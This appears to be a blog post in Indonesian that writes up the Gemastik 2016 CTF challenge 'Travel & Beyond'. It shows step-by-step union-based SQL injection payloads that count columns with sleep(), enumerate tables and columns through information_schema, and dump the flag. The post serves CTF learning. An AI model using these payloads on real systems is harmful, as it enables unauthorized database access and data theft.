---
layout: post
title: "Writeup Gemastik 2016 : Travel & Beyond - 100"
description: "Writeup Gemastik 2016 Online Capture The Flag Qualification"
headline: 
modified: 2016-08-15
category: gemastik
tags: [gemastik,ctf]
imagefeature: /images/gemastik.png
mathjax: 
chart: 
comments: true
featured: false
---

### Problem :

![Travel & Beyond](/images/travel-beyond.png)


### Solusi :

Sesuai clue pada soal kita harus mencari cara untuk melakukan database dump. percobaan pertama kita mencoba melakukan
*SQL Injection* pada search, untuk memastikan SQL Injection kami menggunakan sleep(10) :

`x' union select sleep(10) from information_schema.tables where table_name like '%a#` < ERROR 


`x' union select sleep(10),1 from information_schema.tables where table_name like '%a#` < ERROR.

... SNIP ....

`x' union select sleep(10),1,1,1,1 from information_schema.tables where table_name like '%a#` < SLEEP TEREKSEKUSI ( NORMAL )

berarti pada table yang sebelum union di select memiliki 5 kolom. memuncul kan nama database dengan query :

`x' union select 1,database(),1,1,1 from information_schema.tables where table_name like '%a#` < travel

Mencari nama table : 

`x'  union select 1,table_name,1,1,1 from information_schema.tables where table_schema like '%travel#` < destination

Mencari table lain :

`x'  union select 1,table_name,1,1,1 from information_schema.tables where table_schema like 'travel' and table_name not like 'destination#` < flag

Mencari kolom flag :

`x' union select 1,column_name,1,1,1 from information_schema.columns where table_name like '%flag#` < flag

Dump Flag : 

`x'  union select 1,flag,1,1,1 from flag where flag like 'GEMASTIK#`

![Travel Beyond Flag](/images/travel-beyond-flag.png)